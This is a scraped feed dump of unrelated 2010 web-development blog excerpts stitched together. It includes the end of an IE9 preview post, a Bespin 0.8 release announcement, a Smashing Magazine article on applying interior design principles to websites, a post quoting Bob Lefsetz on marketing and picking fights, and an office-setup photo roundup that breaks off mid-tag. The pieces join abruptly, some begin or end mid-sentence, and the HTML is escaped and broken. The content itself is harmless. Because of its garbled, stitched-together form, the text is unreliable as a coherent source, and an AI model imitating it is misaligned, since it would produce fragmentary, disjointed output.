Traversal, full DOM L2 and L3 events, getComputedStyle from DOM Style, CSS3 Values and Units, and CSS3 multiple backgrounds.</p>\n<p>Also included in the third platform preview is support for using the Web Open Font Format (WOFF) through CSS3 font face. </p>\n<p><img src=\"http://ieblog.members.winisp.net/images/Dean_PPB3_6-2.png\">\n</p></blockquote>\n<p>Oh, and Acid3 is coming along too..... as well as a lot of performance improvements.</p>\n<p><img src=\"http://ieblog.members.winisp.net/images/Dean_PPB3_9.png\" width=\"460\"></p>\n<p>Congrats to the IE team.</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=ibyDyJdKP6k:iJSQ4Omf02o:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=ibyDyJdKP6k:iJSQ4Omf02o:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=ibyDyJdKP6k:iJSQ4Omf02o:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?i=ibyDyJdKP6k:iJSQ4Omf02o:D7DqB2pKExk\" border=\"0\"></a>\n</div>"

Released on June 21st, 2010, Bespin 0.8 is the most important release since Bespin 0.5 introduced the “Embedded” packaging last November. We’ve got a bunch of new features and infrastructure, and new plans for the Bespin server. Read on to find out what is new, skip to the bottom for release notes and download links.</em></p>\n<h2><span></span></h2>\n<h2>A Quick Demo</h2>\n<p>There’s a bit more information in the blog post below, but there’s more action in the video. Check it out:</p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube-nocookie.com/v/zflUo_d-M9A%26hl%3Den_US%26fs%3D1%26hd%3D1&amp;width=560&amp;height=340\" width=\"560\" height=\"340\"></iframe></p>\n<h2>Less</h2>\n<p>There are three features that make Bespin 0.8 “less” than 0.7.</p>\n<p>First, <strong>Bespin Embedded 0.8 minified is now less than half the size of the 0.7.3 release</strong>. The <a href=\"http://ftp.mozilla.org/pub/mozilla.org/labs/bespin/Embedded/BespinEmbedded-DropIn-0.8.0.tar.gz\">“Drop In” release</a> is now just under 300K minified. If you are already using jQuery on your page, you can build a custom Bespin that is about 225K minified and only 65K after gzipping. Without a doubt, there is more we can do to shrink Bespin further, but we’re quite happy with its new, slimmer size. One more bonus with respect to Bespin’s size: Bespin 0.8 makes it possible to dynamically load plugins in Embedded builds. That way, the initially loaded Bespin script can contain just the parts needed to get Bespin going, and extra features can be loaded in as the user wants them.</p>\n<p>Second, Bespin 0.8 includes a new theme capability that allows you to <strong>radically change the appearance through a simple plugin</strong>. <a href=\"https://bespin.mozillalabs.com/docs/pluginguide/theme.html\">Bespin’s themes</a> go beyond just CSS, because we wanted theme creators to be able to change the appearance of plugins they had never even heard of before. Bespin 0.8 <strong>uses the new <a href=\"http://fadeyev.net/2010/06/19/lessjs-will-obsolete-css/\">LESS.js</a></strong> package to allow UI components to use global theme variables so that they can change appearance as the theme dictates. You can see this by switching your Bespin to use the new “white” theme. LESS also provides a very convenient syntax that ensures that Bespin plugins won’t leak the CSS rules onto the page.</p>\n<p>Speaking of leaking onto the page, Bespin 0.8 <strong>exposes only the variable “bespin” to your page</strong>. And there is no more manipulation of built-in object prototypes.</p>\n<h2>More</h2>\n<p>In addition to being less than Bespin 0.7.3, Bespin 0.8 also does more. One of our most requested features has been fulfilled: <strong>you can now embed Bespin’s spiffy command line in custom Embedded builds</strong>. And it’s easier to do than you’d expect. Just add the “command_line” plugin to your manifest file, rebuild and you’ll see the command line there.</p>\n<div style=\"width:537px\"><a href=\"http://mozillalabs.com/bespin/files/2010/06/Bespin-0.8-with-command-line-in-white.png\"><img title=\"Bespin 0.8 with command line in white\" src=\"http://mozillalabs.com/bespin/files/2010/06/Bespin-0.8-with-command-line-in-white.png\" alt=\"\" width=\"527\" height=\"529\"></a><p>Bespin 0.8 with command line in white</p></div>\n<p>We’re able to do this now because of a new <a href=\"https://bespin.mozillalabs.com/docs/embedding/appconfig.html\">“application configuration”</a> mechanism that determines how certain objects that are global within a given Bespin editor are created and how components are added to the GUI. With this new mechanism, we have reached the point where the difference between Bespin Embedded and Bespin+Server is just a difference of configuration (and, of course, the server itself!)</p>\n<p>Speaking of servers, <strong>our dryice build tool</strong>, which is responsible for creating embeddable Bespins, <strong>now includes a little server</strong>. Fire it up, and on each page load it will rebuild your Bespin. It’s the easiest way to try out different plugins and configurations.</p>\n<p>One more oft-requested feature that has now landed in 0.8 is <strong>the ability to replace a &lt;textarea&gt; with Bespin</strong>. Earlier embedded releases could only put themselves in a container. Bespin is now able to replace a textarea and update the textarea when the form is submitted, making Bespin much more of a drop-in replacement for a textarea.</p>\n<p>We’ve added <strong>CSS syntax highlighting</strong>, and all of our <strong>highlighters now run in Web Workers</strong>. By running the highlighters in workers, we get better performance and open the door to add interesting new features in future releases.</p>\n<p>Among the minor tweaks and improvements made: you can indent/unindent blocks of text by selecting the block and hitting tab/shift-tab and a new CSS syntax highlighter, initially contributed by Cody Marquart.</p>\n<h2>For Plugin Authors</h2>\n<p>We’ve got a new, <strong>client-side <a href=\"https://bespin.mozillalabs.com/docs/pluginguide/template.html\">template engine</a></strong> that makes it easy to generate your user interfaces.</p>\n<p>If you’re writing editor commands, you now have access to the same <a href=\"https://bespin.mozillalabs.com/docs/pluginguide/editorapi.html\"><strong>convenient APIs</strong></a> that Embedded users had before. It’s simple to get the selected text, manipulate it and replace it.</p>\n<p>We’ve added a <strong>Growl-like notification system</strong> to Bespin, making it easy for plugin authors to get the user’s attention and easy for the user to choose which kind of notifications they want to see.</p>\n<p>Keep an eye on this blog in the coming days for new tutorials. If you create any plugins that you want to share with the Bespin community within the next few days, please <a href=\"mailto:kdangoor@mozilla.com\">email me</a> so that you can be added to the initial Bespin Plugin Gallery.</p>\n<h2>Bespin Server News</h2>\n<p>During the past few weeks, we’ve figured out where we’re going with the Bespin Server. Given that I’ve written at length about this in other places, I’ll just give the short form here. If you’re interested in the full story, <a href=\"https://bespin.mozillalabs.com/docs/userguide/server_roadmap.html\">you can read about it here</a>.</p>\n<p>The short form is this: software developers work on all kinds of different projects. For Bespin to support “coding in the cloud” for that variety of projects, we need a server that’s as customizable as our editor is. So, <strong>we’re going to rewrite the server in JavaScript and leverage the same plugin system we use on the client</strong>. We’re going to couple that with ways to get that server running easily, so that everyone can run their own Bespin server.</p>\n<p>bespin.mozillalabs.com has never been a “production-level” service. In the future, it will be used to demonstrate Bespin features, but will be <em>even less</em> production-level than it is today. We’ve added the “export” command so that you can <strong>get your projects off of the bespin.mozillalabs.com server</strong>, if you have any data there that you care about.</p>\n<p>As a stepping stone to the new server, we’re planning to package up Bespin for use as a desktop editor. We think that Bespin is a fun and productive editor to use, and it makes a great environment for editing Bespin plugins. The desktop version of Bespin will also be our proving grounds for the JavaScript port of our dryice build tool.</p>\n<p>Bespin 0.8 does add a much-requested server-related feature: <strong>working directories</strong>. The combination of using “cd” to get to a specific spot in the filesystem and “open” with its awesome file searching abilities is a really productive way to navigate between files.</p>\n<h2>Getting Involved</h2>\n<p>Our version numbers have been creeping upwards and 0.8 is not a lot of distance from 1.0. Quite a bit has stabilized on the client side now. The easiest way to get involved with Bespin right now is to <strong>create plugins</strong>. <strong>Syntax highlighters, themes, commands and keymappings</strong> are all straightforward to create.</p>\n<p>Bespin is now ready to add <strong>more user interface components</strong>. Things like a file browser and a toolbar would be great. A notification configuration GUI (like the Growl preferences pane) or a settings UI would be cool. A menu system for commands would be neat as well, and help new users.</p>\n<p>And, of course, there’s <strong>more to be done in the core editor</strong>. Things like TextMate-style snippets (which are fantastic!) and rectangular selection are good bets if you’re looking for a bit of a challenge. And we’re always looking to improve the performance, so profiling and optimization help is ever welcome.</p>\n<p>The <strong>desktop and server</strong> tooling is just about to get started.  We’d love your help on those projects! This will certainly be the area  with the most churn, so you only want to dive in here if you’re feeling  adventurous.</p>\n<h2>Release Notes and Download</h2>\n<p>You can download Bespin Embedded releases from <a href=\"http://ftp.mozilla.org/pub/mozilla.org/labs/bespin/Embedded/\">http://ftp.mozilla.org/pub/mozilla.org/labs/bespin/Embedded/</a></p>\n<p>The complete <a href=\"https://bespin.mozillalabs.com/docs/releases/notes08.html\">Bespin 0.8 release notes</a> are available as part of the official documentation.</p>\n<p>Enjoy the new release!</p>\n<p>– <em>Kevin Dangoor, on behalf of the Bespin project team</em></p>"

We’re all trained in our particular areas (as we should be), but it would do us some good sometimes to look beyond our borders for new approaches to design problems. For a fresh perspective, here we’ll apply several principles of interior design to Web design and see what ideas would help change some of our stuck-in-a-rut design practices.</p><p>[By the way, did you know we have a brand new free <a href=\"http://www.smashingmagazine.com/the-smashing-newsletter/\">Smashing Email Newsletter</a>?

It is achieved in a room when objects on one side of a room are a mirror-image of the other side of the room. It focuses on symmetry (creating a mirrored effect) and is the easiest to create — just think of two nightstands on either side of a bed or two sconces on either side of a fireplace.  However, it can become overwhelming with too many objects or a busy color palette. Too much can make a good design concept ugly.</p><p>Informal balance is an asymmetrical approach based on visual weight. You don’t have to use identical objects to achieve balance; rather, use objects that are different but have similar visual “weight.” For example, you could balance a large couch by putting a large TV in the same room. In Web design, we also seek balance: large type can balance large imagery. Play with informal balance; it can lend intrigue to a seemingly simple design and add quirkiness to a vintage look.</p><h4>Why It’s Important</h4><p>Balance is one of the first things we notice in a design, often subconsciously. If something seems off-kilter, it may have to do with balance, and it can be difficult to move on and appreciate the design’s other aspects. Balancing color, images and textures gives a look of completion to a design and shows the user that you have an eye for detail.</p><h4>Hint for Designers</h4><p>Balance isn’t limited to being either symmetrical or asymmetrical. Try radial balance too: center a circular image and add smaller images “radiating” away from it (an example from interior design would be a circular dining table and chairs). Radial balance designates a focal point and almost effortlessly provides for a sense of rhythm or momentum.</p><h4>Examples</h4><p><a href=\"http://travisgertz.com/articles/analog/\">Travis Gertz Experimentationalism</a><br> Here, the designer uses visual weight to achieve balance. The word “analog” is extremely big, but it balances out the larger width and length of the camera image — a point-size smaller and the word would have been lost. Below the image is smaller type, but it works because the paragraph spans the same width and height as the image.</p><p><a href=\"http://www.davidg.ro\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Balance2.jpg\" alt=\"Balance2 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://www.ethnoport.pl/\">Ethno Port Ponzan</a><br> Ethno Port Ponzan’s design uses radial balance, having the sub-page links placed on rings around a central focus. Though the links are placed at different distances, the ring design lends the balance because they lay equidistantly from the center logo. Radial balance can be one of the easiest, fastest methods of achieving balance, and Ethno Port Ponzan is an example of using such balance successfully.</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/Balance5.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/Balance5.jpg\" alt=\"Balance5 in Applying Interior Design Principles To The Web\" width=\"500\" height=\"278\"></a></p><p><a href=\"http://www.zee.com.br/en/\">Zee</a><br> This is asymmetrical balance using text as the design. Here “Always in the loop” is the focal point, and the designer uses the visual weight of heavier fonts, large punctuation and smaller images for balance.</p><p><a href=\"http://www.zee.com.br/en/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Balance3.jpg\" alt=\"Balance3 in Applying Interior Design Principles To The Web\"></a></p><h3>Proportion</h3><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/proportionsectionimage.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/proportionsectionimage.jpg\" alt=\"Proportionsectionimage in Applying Interior Design Principles To The Web\" width=\"500\" height=\"300\"></a></p><h4>How It Works</h4><p>Proportion has to do with how the sizes of objects in a room relate to each other. For instance, a large couch shouldn’t be in front of a 16″ TV, and a large bed shouldn’t be between small end tables. The same rule goes for Web design; a large font shouldn’t be put beside a small focal point. We could also consider this when doing “scene” designs, such as a wall with frames and landscape illustrations.</p><h4>Why It’s Important</h4><p>Proportion is like balance: if it feels off, it’s hard to focus on anything else. Proportion is vital to recreating an environment. If a coffee mug is too big for a desk or a cow too large for the landscape, it’s hard to believe the setting. True-to-life proportion makes a scene believable and a font-graphic relationship appealing.</p><h4>Hint for Designers</h4><p>Most of us think that flamboyantly large text beside a large image is overbearing, and we tend to “fix” the problem by making one of them smaller. For proportion, though, we should keep large with large and small with small; that keeps the design believable and balanced.</p><h4>Examples</h4><p><a href=\"http://foxie.ru/\">Foxie</a><br> Foxie’s design is a great example of effective proportion because the bookcase area features objects that are generally in proportion and therefore “believable.” The various items in the bookcase (such as the remote and trophy) are meant to establish a whimsical atmosphere, so we can be somewhat lenient in accepting the scene as realistic. That is, despite the few inconsistencies in proportion, we still “buy it.”</p><p><a href=\"http://foxie.ru/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Proportion1.jpg\" alt=\"Proportion1 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://workawesome.com/\">Work Awesome</a><br> Much like Foxie, our eyes move naturally from the meat of the design to the information area because we aren’t distracted by disproportion. This scene’s main objects — keyboard, coffee cup, computer mouse — are realistically proportionate. Like the last example, it’s believable.</p><p><a href=\"http://workawesome.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Proportion2.jpg\" alt=\"Proportion2 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://www.rzmota.com/\">RZMota</a><br> Unlike Work Awesome (in which a large part of the design focuses on the information area), RZMota’s design relies heavily on the believability of the scene. Making all of the objects proportional is not easy, especially with so many of them, but RZMota shows us that it can be done.</p><p><a href=\"http://www.rzmota.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Proportion3.jpg\" alt=\"Proportion3 in Applying Interior Design Principles To The Web\"></a></p><h3>Rhythm</h3><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/rhythmsectionimage.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/rhythmsectionimage.jpg\" alt=\"Rhythmsectionimage in Applying Interior Design Principles To The Web\" width=\"500\" height=\"300\"></a></p><h4>How It Works</h4><p>In interiors, rhythm is created by placing a unifier in the room, such as a color, pattern or texture. A sense of movement is created when the unifier is repeated throughout the space; the eye doesn’t stop on one piece but rather alights here and there on pieces of the unifier. We can do this in Web design as well by taking a texture, pattern or form and repeating it throughout a design.</p><h4>Why It’s Important</h4><p>Rhythm keeps the room cohesive and allows the eye to move easily about the room to experience all parts of the design. Rhythm is as important to Web design as it is in physical places. In a unified design, finding information happens naturally and at a rhythmic pace.</p><h4>Hint for Designers</h4><p>The single most important thing to remember is to <strong>add variety to the repetition</strong>. If the color white is your unifier, then use it in textures, images, CSS, etc. A little variety is healthy and keeps a website from becoming boring.</p><h4>Examples</h4><p><a href=\"http://interface.fh-potsdam.de/innoforum/english/index.php\">Interaktionsdesign</a><br> The rhythm on Interaktionsdesign’s site extends past the yellow accents. Rather, the careful repetition of the small arrows allows the eye to flow around the page and lends cohesiveness to the design. By using small arrows in the header, sub-headers and as links in the bottom left corner guide the visitor to the information they need. The yellow acts as a supplement, a highlight to these areas and backup plan in case the arrows didn’t catch visitor attention.</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/Rhythm11.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/Rhythm11.jpg\" alt=\"Rhythm11 in Applying Interior Design Principles To The Web\" width=\"500\" height=\"293\"></a></p><p><a href=\"http://www.digitalpodge.co.uk/2009/\">Digital Podge</a><br> Like Clandrei, Digital Podge’s repetition of shapes creates cohesion and makes the eye move about. But this website showcases another perk of rhythm: no matter what is being repeated (i.e. no matter what the unifier), it can be used to highlight links and other information that is imperative to the user experience. On Digital Podge, the circles either indicate links to other pages or showcase an area that the visitor needs to see.</p><p><a href=\"http://www.digitalpodge.co.uk/2009/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Rhythm2.jpg\" alt=\"Rhythm2 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://www.hellobard.com/\">Bard Hole Standal</a><br> The yellow color and slanted lines give this website its rhythm by dancing around the website to attract attention. This shows that a website can have more than one major repeating feature to create rhythm. The yellow is present in a <strong>variety</strong> of elements, which themselves repeat.</p><p><a href=\"http://www.hellobard.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Rhythm3.jpg\" alt=\"Rhythm3 in Applying Interior Design Principles To The Web\"></a></p><h3>Emphasis</h3><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/emphasissectionimage.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/emphasissectionimage.jpg\" alt=\"Emphasissectionimage in Applying Interior Design Principles To The Web\" width=\"500\" height=\"300\"></a></p><h4>How It Works</h4><p>Emphasis is the same thing as focal point. TVs, fireplaces, artwork: we all have an idea of what qualifies as the focal point of an interior space. It is typically in the center of the space and is the first thing to catch your eye. In Web design, as in interiors, we sometimes create focal points unintentionally. This can be caused by a central or large object in a design, or a central or large text area in a code-heavy layout. Try to complement your focal point with other features such as color, form and texture.</p><h4>Why It’s Important</h4><p>While focal points are often chosen for their aesthetic value, they serve a larger purpose in design. The focal point is the anchor of the space, and the item around that should influence all other design decisions.</p><h4>Hint for Designers</h4><p>Your secondary pieces don’t have to fall behind. By choosing a large focal point and centering it, you give the space its foundation; this allows the surrounding images to be quirky, without altering the atmosphere or making the design seem “hodge-podge.” Use different border colors to your advantage, or place your surrounding images in a way that appears random.</p><h4>Examples</h4><p><a href=\"http://www.kobibenezri.com/\">Kobi Benezri Studio</a><br> The focal point here — the typewriter — is the first place most of us will look. This happens for two reasons. First, it is one of the largest images on the page and so demands your attention. Secondly, there is more white space in that image than in any of the others, which creates contrast. The surrounding images are set in the same monochromatic palette, which throws them into relief.</p><p><a href=\"http://www.kobibenezri.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Emphasis1.jpg\" alt=\"Emphasis1 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://www.marcecko.com/#/\">Marc Ecko</a><br> Ecko’s name and photo are the central points of focus.

The countless combinations influence our thoughts, opinions and feelings. Because color does so much, our discussion of it has to be limited here: we’ll talk about what it does to the amount of space in your design.</p><p>In interiors, the use of warm or cool colors is dictated by factors such as how much light the room gets, how much time you spend in it and how big it is. We Web designers don’t have to worry about these determinants, but we should consider color’s spatial influences when working with heavy or lighter layouts. If your layout is heavy with text, texture, images and the like, go for cooler tones, such as blues, aquas, turquoise and sage. These will make the space seem larger and balance the heaviness. Use warmer tones (red, orange, yellow) to create the appearance of extra space in a minimalist design.</p><h4>Why It’s Important</h4><p>The color in our home offers a glimpse into our personality. Our websites are our technological homes, so why would we put any less effort into their color scheme?</p><h4>Hint for Designers</h4><p>If you’d like to know whether certain colors go together, look to nature. Think of the beach, and you’ll realize that turquoise, beige and cream go together. Think of fields in autumn, and you’ll think of red, orange, brown and green. Purple, brown, magenta and green are eggplant-themed, while violet, navy and green remind us of hydrangeas. Grays, blacks and browns will always anchor other colors and provide relief. In addition, because of their neutrality, anchor colors don’t have to be included in the palette count; they allow for diversity. The color schemes of our websites also influence users by making them feel calm (with cool tones) or energetic and upbeat (with warm tones).

The blue background makes the amount of information less daunting by “expanding” the space. Imagine this website in red — wouldn’t the space have looked smaller and more cluttered?</p><p><a href=\"http://saskiamusic.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/Color9.jpg\" alt=\"Color9 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://www.octonauts.com/\">Octonauts</a></p><p>The Octonauts site is very busy: We have a patterned background, busy header image and two columns of featured news. However, what cools this business are the blue tones throughout. In addition, aside from the few bursts of warm tones, the layout uses mostly cool tones: sage green, light gray, teal and white. Featuring the same layout in warmer tones would have amped up the busyness, and with this much going on on the site, cool tones were a necessity.</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/Color10.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/Color10.jpg\" alt=\"Color10 in Applying Interior Design Principles To The Web\" width=\"500\" height=\"288\"></a></p><p><a href=\"http://ftdesigner.net/\">ft designer</a><br> ft designer uses black as its anchor color, which allows it to incorporate multiple colors (blue, green, white and yellow-green) without becoming overbearing and rainbow-esque.</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/TOTexture3.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/TOTexture3.jpg\" alt=\"TOTexture3 in Applying Interior Design Principles To The Web\" width=\"500\" height=\"287\"></a></p><h3>Texture</h3><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/texturesectionimage.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/texturesectionimage.jpg\" alt=\"Texturesectionimage in Applying Interior Design Principles To The Web\" width=\"500\" height=\"300\"></a></p><h4>How It Works</h4><p>The key to success is to mix different textures. This is as true for the Web as it is for interiors. Pair rough with slick, patterned with plain, coarse with fine, fuzzy with silky and shiny with matted. Don’t be afraid to experiment with unlikely combinations. You’ll be surprised how well textures bring out the best in each other.</p><h4>Why It’s Important</h4><p>Texture is a strong determining factor in a user’s emotional response to a design. Balance, proportion, rhythm, emphasis and color are the basic principles, and texture is a <strong>necessary enhancement</strong>; it’s the cherry on top.</p><h4>Hint for Designers</h4><p>The need for texture almost doubles when using a monochromatic palette. Monochromatic palettes can easily become boring, whether in interiors or on the Web. But they can be intriguing and multi-faceted, and one of the easiest ways to make them that way is to give them plenty of texture.</p><h4>Examples</h4><p><a href=\"http://www.coraline.com/\">Coraline</a></p><p>Coraline features a variety of textures, but the diversity doesn’t take away from the concept. Running with an old-world, grass-roots advertisement motif, Coraline uses stained papers, the look of ‘placarded’ posters, a run-down suitcase with velveteen lining and thin brass nameplates. In so doing, Coraline shows that designers don’t have to sacrifice a strong theme for variety.</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/TOTexture11.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/TOTexture11.jpg\" alt=\"TOTexture11 in Applying Interior Design Principles To The Web\" width=\"500\" height=\"288\"></a></p><p><a href=\"http://www.fivecentstand.com/\">Five Cent Stand</a><br> At Five Cent Stand, the layering of old papers and pictures with a soft patterned texture is interesting, not overbearing.</p><p><a href=\"http://www.fivecentstand.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/TOtexture1.jpg\" alt=\"TOtexture1 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://www.rosefu.net/\">Rose Fu</a><br> Rose Fu uses multiple textures in its monochromatic palette. Had there been more colors, so many textures might not have been necessary.</p><p><a href=\"http://www.rosefu.net/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/texture.jpg\" width=\"500\" height=\"402\" alt=\"Texture in Applying Interior Design Principles To The Web\"></a></p><h3>Lines</h3><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/linessectionimage.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/linessectionimage.jpg\" alt=\"Linessectionimage in Applying Interior Design Principles To The Web\" width=\"500\" height=\"300\"></a></p><h4>How It Works</h4><p>Popular places for lines in a room are the floor, upholstery and, more notably, the walls. They’re a simple addition, but lines say a lot about a space. For instance, horizontal lines often give a casual vibe, while vertical lines express formality. Curvy lines can add grace or whimsy, while diagonal lines provide rhythm and movement. You can get creative by using atypical methods to create lines, as seen in the image on the left.</p><h4>Why It’s Important</h4><p>Lines help <strong>create a mood</strong> in an interior space and can provide the same benefit online. The best thing about lines is that they can be as understated or as powerful as you’d like, so it’s one of the less daunting design choices you’ll make.</p><h4>Hint for Designers</h4><p>Don’t be afraid to combine lines to find a good balance. For instance, adding horizontal lines can calm the strong formalities of vertical lines, just as curvy lines can add playfulness to casual horizontals. In addition, verticals and horizontals can be applied in a grid-like pattern for the appearance of structure and cleanliness.</p><h4>Examples</h4><p><a href=\"http://www.vyniknite.sk/\">Vyniknite</a><br> Vyniknite uses curvy lines to represent blowing wind, giving a whimsical feel to the design.</p><p><a href=\"http://www.vyniknite.sk/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/TOlines1.jpg\" alt=\"TOlines1 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://www.danielkusaka.com/v3/#/pt\">Daniel Kusaka</a><br> Kusaka’s website uses diagonal lines around the square images, creating movement in a layout that could have easily felt stagnant. This simple alteration is enhanced by the various colors of the lines, making them more noticeable and therefore more effective.</p><p><a href=\"http://www.danielkusaka.com/v3/#/pt\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/TOlines2.jpg\" alt=\"TOlines2 in Applying Interior Design Principles To The Web\"></a></p><p><a href=\"http://www.whats-up-cupcake.com/\">What’s Up Cupcake?</a></p><p>What’s Up Cupcake? isn’t about adding a combination of lines to combine or ease certain vibes. Rather, the site uses lines to add to an already formal feel: While ornate picture frames and formal curves around the logo and link area supply the formality, and the vertical lines emphasize it.</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/TOLines10.jpg\"><img

After reading <a href=\"http://www.newsweek.com/2010/04/01/chaos-theory.html\">this Newsweek article about 37signals</a>, he offered <a href=\"http://lefsetz.com/wordpress/index.php/archives/2010/04/08/37signalscomrework/\">some great commentary about similar lessons he’s learned in the music business</a>.</p>\n\n\n\t<p>Here he talks about how all the marketing in the world can’t replace a product that sells itself:</p>\n\n\n<blockquote>\n\n\t<p>As Ahmet Ertegun once said, a hit is a record that gets a listener to jump out of bed, put on his clothes and go to the all night record store to buy it after hearing it on the radio.  I listen to the radio in my car all day long.  But it’s rare that I have to write down the title of a song and rush to my computer to download the track.  Happened with Gnarls Barkley’s “Crazy”.  And, in the CD era, with Alanis Morissette’s “Hand In Pocket”, I had to go home and rifle through hundreds of CDs to find “Jagged Little Pill”.  And then there’s Walt Wilkins/Pat Green’s “Wrapped”…  Point is, hit records sell themselves, like drugs.  If your record is not selling itself, you’re never going to make it.  In other words, if you’re working me, you’re in trouble.  Your track should be so great I hear about it from someone else!</p>\n\n\n</blockquote>\n\n\t<p>And then he explains why he loves picking fights:</p>\n\n\n<blockquote>\n\n\t<p>I was listening to Richard Roeper on Howard Stern, he lamented the guest hosts from Hollywood who co-starred with him on “At The Movies” would say nothing negative, for fear of alienating some potential business contact.  But it’s when you say something negative that you endear yourself to a group!  And if you’re offering a better product…</p>\n\n\n\t<p>Are you willing to state your truth and own it?  Elton John talks shit about other people. But most acts demur.  I’d like Jon Bon Jovi if he just said <span>SOMETHING</span> or <span>SOMEONE</span> sucked.   But he’s so busy sucking the public’s dick I miss no chance to beat him up, point out his band’s foibles, because he’s not real…and I know many people agree with me. Then again, most people are indifferent!  And only by taking a side can you get them to care!</p>\n\n\n</blockquote>\n\n\t<p><a href=\"http://lefsetz.com/wordpress/index.php/archives/2010/04/08/37signalscomrework/\">The whole thing</a> is full of gems.

From my personal opinion, I’d say that your own office is the perfect one. Then again, this all depends on what we have, what we use and if we’re pleased with it. I’m not even close to satisfied with my office yet, but I’m working on it.</p>\n<p>For all of you who has your office setup already, but could still use some inspiration or suggestions on how to improve it, or if you haven’t setup your office just yet (like me), this small round-up will definitely get you inspired.<span></span></p>\n<h2>Leopard Fever</h2>\n<p><a href=\"http://www.flickr.com/photos/crouchingdonkey/1952501492/in/set-72157594277366817/\"><img src=\"http://farm3.static.flickr.com/2270/1952501492_8dcd692694_b.jpg\" alt=\"\" width=\"550\" height=\"366\"></a><br>\nNow this is a sweet setup, very nice positioning and placements of the screens with a very nice addition – TV connected to the computer for movies. Clean, discreate, awesome and just wonderful – don’t you just love it?</p>\n<h2>Apple Cinema Display Setup – Upright</h2>\n<p><a href=\"http://www.flickr.com/photos/verymickey/2292224473/\"><img src=\"http://farm4.static.flickr.com/3063/2292224473_20113b0862_o.jpg\" alt=\"\" width=\"550\" height=\"413\"></a><br>\nI like this setup due to the vertical placements of the screens. It makes it looks so much cleaner and it saves a lot of space on your desk. Notice the very nice addition of a tablet? Fits perfectly with the overall office.</p>\n<h2>Scenic Office</h2>\n<p><a href=\"http://www.flickr.com/photos/penningtonj/3891419513/in/pool-350714@N25\"><img src=\"http://farm4.static.flickr.com/3432/3891419513_34efe31fa3_o.jpg\" alt=\"\" width=\"550\" height=\"448\"></a><br>\nThis looks like a real office, three big screens, a corded phone in front of them and a filing cabinet beside the desk. I love the really serious look this setup gives me, and that’s not all – the digital photoframe is a great addition.</p>\n<h2>Camo Workstation</h2>\n<p><a href=\"http://www.flickr.com/photos/skateaddict/3850601036/in/pool-350714@N25\"><img src=\"http://farm4.static.flickr.com/3510/3850601036_ef0dd4511c_b.jpg\" alt=\"\" width=\"550\" height=\"376\"></a><br>\nLooks playful at the same time that it looks really serious. Love the military pattern with the great addition of the “caution” tape. The three photo frames is just a bonus in this office, makes it look complete in a very professional way.</p>\n<h2>Emotion Studio</h2>\n<p><a href=\"http://www.flickr.com/photos/timsamoff/536130402/\"><img src=\"http://farm2.static.flickr.com/1009/536130402_f1bc9f475e_b.jpg\" alt=\"\" width=\"550\" 